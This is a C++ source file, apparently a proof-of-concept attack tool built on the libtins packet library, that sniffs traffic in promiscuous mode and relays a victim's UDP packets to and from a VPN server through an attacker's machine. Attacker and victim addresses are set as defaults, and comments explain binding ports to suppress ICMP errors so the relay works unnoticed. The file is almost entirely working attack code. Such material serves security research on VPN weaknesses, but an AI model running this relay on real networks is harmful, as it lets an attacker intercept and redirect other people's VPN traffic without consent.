#include <tins/tins.h>
#include <cassert>
#include <iostream>

#include <string>
#include <unistd.h>
#include <thread>
#include <random>
#include <chrono>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h> /* superset of previous */

using std::thread;
using std::cout;
using std::string;
using std::vector;
using namespace Tins;


bool DEBUG=true;

string public_iface="enp0s8";
string attacker_pub_ip="192.168.4.254";

string victim_ip="192.168.1.254";
unsigned short victim_port=31338;

string vpn_ip="192.168.2.254";
unsigned short vpn_port=1194;

bool relay_packet(PDU &some_pdu){
	PacketSender sender;
	NetworkInterface iface(public_iface);
	
	const IP &ip = some_pdu.rfind_pdu<IP>();
	const UDP &udp = some_pdu.rfind_pdu<UDP>();
	const RawPDU& raw = udp.rfind_pdu<RawPDU>();

	if (ip.src_addr() == victim_ip) {
		std::cout << "Received victim packet to vpn server: src="
			<< ip.src_addr() << ":" << udp.sport() 
			<< ", dst=" << ip.dst_addr() << ":" << udp.dport() << ", length=" <<udp.length()
			<< std::endl;
		IP pkt = IP(vpn_ip) /
			UDP(vpn_port, victim_port) / raw;
		sender.send(pkt, iface);
	}
	else if (ip.src_addr() == vpn_ip &&
			ip.dst_addr() == attacker_pub_ip && udp.dport() == victim_port) {
		std::cout << "Received vpn packet to victim: src="
			<< ip.src_addr() << ":" << udp.sport() 
			<< ", dst=" << ip.dst_addr() << ":" << udp.dport() << ", length=" <<udp.length()
			<< std::endl;
		IP pkt = IP(victim_ip) /
			UDP(victim_port, vpn_port) / raw;
		sender.send(pkt, iface);

	
	} else {
		if (DEBUG) {
			std::cout << "Received something else: src="
				<< ip.src_addr() << ":" << udp.sport()
				<< ", dst=" << ip.dst_addr() << ":" << udp.dport() << ", length=" <<udp.length()
				<< std::endl;
		}
	} 	
	
	return true;

}

void relay_packet_handler() {
	SnifferConfiguration config;
	config.set_promisc_mode(true);
	Sniffer sniffer("any", config);
	sniffer.sniff_loop(relay_packet);
}

int main(int argc, char** argv) {

	if (argc == 7) {

		cout << argv[0] << ": [public_iface] [attacker_pub_ip] [victim_ip] [victim_port] [vpn_ip] [vpn_port]" << std::endl;
		public_iface = argv[1];
		attacker_pub_ip = argv[2];
		
		victim_ip = argv[3]; // dns server IP
		victim_port = atoi(argv[4]);
		
		vpn_ip = argv[5]; // dns server IP
		vpn_port = atoi(argv[6]);
	} else {
		cout << "Using default paremeters." << std::endl;
	}
	
	// BEGIN: configuring sockets This is neccessary in two case,
	// first, the victim's VPN requests get routed back to the
	// attacker tun ip address, but since the attacker isn't
	// actually listening on anything the port is not bound and
	// linux responds with and ICMP PORT UNREACHABLE message as a
	// results.  Second, when the attacker "NAT"s the victims
	// packets back to the VPN, the VPN server sends packets back
	// to the attacker, but again, since the attacker isn't
	// actually listening, linux normally responds with the same
	// type of ICMP message. binding to the VPN's listening port
	// and the victim's source port prevent this from happening,
	// otherwise, the ICMP packets would interfer with the relay 
	int sockfd1, sockfd2;
	struct sockaddr_in servaddr1;
	struct sockaddr_in servaddr2;

	if ( (sockfd1 = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) {
		perror("socket creation failed");
		exit(EXIT_FAILURE);
	}
	memset(&servaddr1, 0, sizeof(servaddr1));
	
	// Filling server information
	servaddr1.sin_family    = AF_INET; // IPv4
	servaddr1.sin_addr.s_addr = INADDR_ANY;
	servaddr1.sin_port = htons(vpn_port);
	
	// Bind the socket with the server address
	if ( bind(sockfd1, (const struct sockaddr *)&servaddr1,
	    sizeof(servaddr2)) < 0 )
	{
		perror("bind failed");
		exit(-1);
	}


	if ( (sockfd2 = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) {
		perror("socket creation failed");
		exit(EXIT_FAILURE);
	}
	memset(&servaddr2, 0, sizeof(servaddr2));
	
	// Filling server information
	servaddr2.sin_family    = AF_INET; // IPv4
	servaddr2.sin_addr.s_addr = INADDR_ANY;
	servaddr2.sin_port = htons(victim_port);

	// Bind the socket with the server address
	if ( bind(sockfd2, (const struct sockaddr *)&servaddr2,
	    sizeof(servaddr2)) < 0 )
	{
		perror("bind failed");
		exit(-1);
	}
	// END: configuring sockets 
	
	std::cout << "Starting VPN Relay " << std::endl;
	thread relay_thread(relay_packet_handler);
	relay_thread.join();
	
	return 0;
}

